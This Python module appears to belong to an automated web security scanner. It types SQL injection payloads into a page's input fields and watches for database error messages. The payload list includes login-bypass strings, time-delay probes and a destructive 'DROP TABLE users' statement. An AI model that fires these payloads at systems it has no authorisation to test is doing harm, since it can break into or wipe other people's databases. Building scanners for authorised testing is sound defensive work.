# ruff: noqa: E501
"""SQL injection test module."""

from __future__ import annotations

from collections.abc import Callable
from typing import Any


async def test_sqli(
    page: Any,
    add_finding: Callable[[dict[str, Any]], dict[str, Any]],
) -> dict[str, Any]:
    """Test input fields for SQL injection vulnerabilities."""
    url = page.url
    findings: list[dict[str, Any]] = []

    sqli_payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "1' UNION SELECT NULL--",
        "' AND 1=1--",
        "1; DROP TABLE users--",
        "admin'--",
        "' WAITFOR DELAY '0:0:3'--",
        "' AND SLEEP(3)--",
    ]

    error_patterns = [
        r"sql syntax.*mysql",
        r"warning.*mysql_",
        r"valid mysql result",
        r"postgresql.*error",
        r"warning.*pg_",
        r"microsoft.*odbc.*sql server",
        r"sqlserver.*jdbc",
        r"sqlite.*error",
        r"sqlite3",
        r"ora-\d{5}",
        r"oracle.*driver",
        r"sql command not properly ended",
        r"unclosed quotation mark",
        r"syntax error.*sql",
    ]

    targets = await page.evaluate(
        """() => {
            const inputs = document.querySelectorAll(
                "input[type='text'], input[type='search'], input:not([type]), textarea"
            );
            return Array.from(inputs).slice(0, 5).map((el, i) => ({
                index: i,
                tag: el.tagName,
                name: el.name || "",
                id: el.id || "",
            }));
        }"""
    )

    if not targets:
        return {"category": "sqli", "findings": findings, "message": "No input fields found to test"}

    import re

    for target in targets:
        selector = f"#{target['id']}" if target.get("id") else (
            f"[name=\"{target['name']}\"]" if target.get("name") else None
        )
        if not selector:
            continue

        for payload in sqli_payloads:
            try:
                locator = page.locator(selector).first()
                visible = await locator.is_visible()
                if not visible:
                    continue

                await locator.fill(payload)
                await locator.press("Enter")
                await page.wait_for_timeout(2000)

                page_content = await page.content()
                for pattern_str in error_patterns:
                    if re.search(pattern_str, page_content, re.IGNORECASE):
                        findings.append(
                            add_finding(
                                {
                                    "category": "sqli",
                                    "severity": "critical",
                                    "title": "SQL injection vulnerability detected",
                                    "description": f'SQL error triggered by payload in "{selector}"',
                                    "url": page.url,
                                    "evidence": {
                                        "selector": selector,
                                        "payload": payload,
                                        "errorPattern": pattern_str,
                                    },
                                }
                            )
                        )
                        break

                await page.goto(url, wait_until="domcontentloaded", timeout=10000)
            except Exception:
                continue

    return {"category": "sqli", "findings": findings}
